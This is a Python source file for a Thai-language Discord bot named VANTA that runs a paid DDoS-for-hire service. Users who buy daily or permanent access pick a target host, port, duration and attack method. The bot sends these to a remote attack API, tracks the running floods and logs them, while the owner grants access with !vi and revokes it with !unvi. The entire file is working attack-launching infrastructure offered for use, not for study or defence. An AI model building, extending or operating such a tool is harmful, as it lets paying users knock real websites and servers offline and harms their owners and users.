# bot.py
import asyncio
import ipaddress
import os
import signal
import time
import traceback
from urllib.parse import urlparse

import aiohttp
import discord
from discord.ext import commands

from config import (
    BOT_TOKEN, PREFIX, OWNER_ID, MAX_DURATION, DATA_DIR,
    API_BASE, API_KEY, FORBIDDEN_TLDS, FORBIDDEN_IPS,
)
from database import Database
from ui_v2 import (
    build_panel, AttackModal, build_category_view,
    build_method_view, build_running,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
active_attacks: dict[int, dict] = {}


# ═══════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════
def _extract_host(target: str) -> str:
    t = target.strip().lower()
    if "://" in t:
        return urlparse(t).hostname or ""
    if t.startswith("["):
        e = t.find("]")
        if e > 0:
            return t[1:e]
    return t.split("/")[0].split(":")[0]


def is_forbidden(target: str) -> bool:
    host = _extract_host(target)
    if not host:
        return False
    if any(host == tld.lstrip(".") or host.endswith(tld)
           for tld in FORBIDDEN_TLDS):
        return True
    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return True
    except ValueError:
        pass
    return host in FORBIDDEN_IPS


def _parse_duration(s: str):
    s = s.strip()
    if s.upper() == "TH":
        return 0
    if len(s) < 2:
        return None
    try:
        n = int(s[:-1])
    except ValueError:
        return None
    u = s[-1].lower()
    if u == "m":
        return n * 60
    if u == "h":
        return n * 3600
    if u == "d":
        return n * 86400
    return None


def _edit_kwargs(view):
    try:
        return {"view": view, "flags": discord.MessageFlags.components_v2}
    except AttributeError:
        return {"view": view}


# ═══════════════════════════════════════════
# Events
# ═══════════════════════════════════════════
@bot.event
async def on_ready():
    os.makedirs(DATA_DIR, exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")
    print(f"[VANTA] active attacks: {len(active_attacks)}")


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MemberNotFound):
        await ctx.send("หา member ไม่เจอ")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
        return
    print(f"[err] {error}")
    traceback.print_exception(type(error), error, error.__traceback__)


# ═══════════════════════════════════════════
# !ddos / !vi / !unvi
# ═══════════════════════════════════════════
@bot.command(name="ddos", aliases=["panel"])
async def ddos_cmd(ctx):
    await ctx.send(**_edit_kwargs(build_panel()))


@bot.command(name="vi")
async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
        return
    if member is None:
        await ctx.send("ใช้: `!vi @user 1h` (TH = ถาวร)")
        return
    secs = _parse_duration(duration)
    if secs is None:
        await ctx.send("รูปแบบ: 1m / 1h / 1d / TH")
        return
    forever = secs == 0
    await db.add_virus(member.id, secs, forever)
    await ctx.send(
        f"ให้ไวรัส **{member.mention}** "
        f"({'ถาวร' if forever else duration})"
    )


@bot.command(name="unvi")
async def unvi_cmd(ctx, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
        return
    if member is None:
        await ctx.send("ใช้: `!unvi @user`")
        return
    await db.remove_virus(member.id)
    await ctx.send(f"ปลดไวรัส **{member.mention}** แล้ว")


# ═══════════════════════════════════════════
# Flow
# ═══════════════════════════════════════════
async def open_attack_modal(interaction: discord.Interaction):
    uid = interaction.user.id
    if not await db.has_virus(uid):
        await interaction.response.send_message(
            "มาซื้อไวรัสมาาาา แค่วันละ 40 เอง ถาวร 300", ephemeral=True)
        return
    if uid in active_attacks:
        await interaction.response.send_message(
            "รอของเก่าหมดก่อน", ephemeral=True)
        return
    await interaction.response.send_modal(AttackModal())


async def handle_attack_submit(interaction: discord.Interaction, modal):
    uid = interaction.user.id
    if not await db.has_virus(uid):
        await interaction.response.send_message(
            "มาซื้อไวรัสมาาาา", ephemeral=True)
        return
    if uid in active_attacks:
        await interaction.response.send_message(
            "รอของเก่าหมดก่อน", ephemeral=True)
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        dur = min(int(modal.duration.value), MAX_DURATION)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง", ephemeral=True)
        return

    if port < 1 or port > 65535 or dur < 1:
        await interaction.response.send_message("ค่าไม่ถูกต้อง", ephemeral=True)
        return
    if is_forbidden(target):
        await interaction.response.send_message(
            "ห้ามยิงไอ้ควายอ่านกฎด้วย", ephemeral=True)
        return

    view = build_category_view(uid, target, port, dur)
    try:
        await interaction.response.send_message(
            ephemeral=True, **_edit_kwargs(view))
    except TypeError:
        await interaction.response.send_message(view=view, ephemeral=True)


async def show_method_panel(interaction: discord.Interaction,
                            cat: str, target: str, port: int, dur: int):
    uid = interaction.user.id
    view = build_method_view(cat, uid, target, port, dur)
    try:
        await interaction.response.edit_message(**_edit_kwargs(view))
    except TypeError:
        await interaction.response.edit_message(view=view)


async def fire_attack(interaction: discord.Interaction, method: str,
                      target: str, port: int, dur: int):
    uid = interaction.user.id

    try:
        await interaction.response.edit_message(
            **_edit_kwargs(build_running(method, target, port, dur, dur, "...")))
    except TypeError:
        await interaction.response.edit_message(
            view=build_running(method, target, port, dur, dur, "..."))
    msg = await interaction.original_response()

    url = f"{API_BASE}/attack?key={API_KEY}"
    payload = {"method": method, "target": target, "port": port, "duration": dur}

    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=payload,
                              timeout=aiohttp.ClientTimeout(total=30)) as r:
                data = await r.json()
    except Exception as e:
        await _safe_edit(msg, build_running(method, target, port, 0, dur, f"error: {e}"))
        return

    if not data.get("success"):
        detail = data.get("detail", "fail")
        await _safe_edit(msg, build_running(method, target, port, 0, dur, f"API: {detail}"))
        return

    await db.log_attack(uid, target, port, method, dur)
    state = {"job_id": data.get("job_id"), "msg": msg, "start": time.time()}
    active_attacks[uid] = state
    asyncio.create_task(_tick(uid, state, method, target, port, dur))


async def _safe_edit(msg, view):
    try:
        await msg.edit(**_edit_kwargs(view))
    except Exception:
        try:
            await msg.edit(view=view)
        except Exception:
            pass


async def _tick(uid, state, method, target, port, dur):
    msg = state["msg"]
    st = state["start"]
    while time.time() - st < dur:
        await asyncio.sleep(1)
        left = max(0, int(dur - (time.time() - st)))
        await _safe_edit(msg, build_running(method, target, port, left, dur, "running"))

    # fix M3: kill job ที่ API server
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"{API_BASE}/stop?key={API_KEY}",
                json={"job_id": state["job_id"]},
                timeout=aiohttp.ClientTimeout(total=5))
    except Exception:
        pass

    active_attacks.pop(uid, None)
    await _safe_edit(msg, build_running(method, target, port, 0, dur, "finished"))


# ═══════════════════════════════════════════
# Signal handler (fix M1)
# ═══════════════════════════════════════════
def _shutdown(sig, frame):
    print(f"\n[VANTA] signal {sig} received — shutting down")
    raise SystemExit(0)


def _install_signals():
    try:
        signal.signal(signal.SIGINT, _shutdown)
        signal.signal(signal.SIGTERM, _shutdown)
    except ValueError:
        pass


# ═══════════════════════════════════════════
# Run
# ═══════════════════════════════════════════
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise SystemExit("❌ BOT_TOKEN ไม่ได้ตั้ง")
    os.makedirs(DATA_DIR, exist_ok=True)
    _install_signals()
    bot.run(BOT_TOKEN)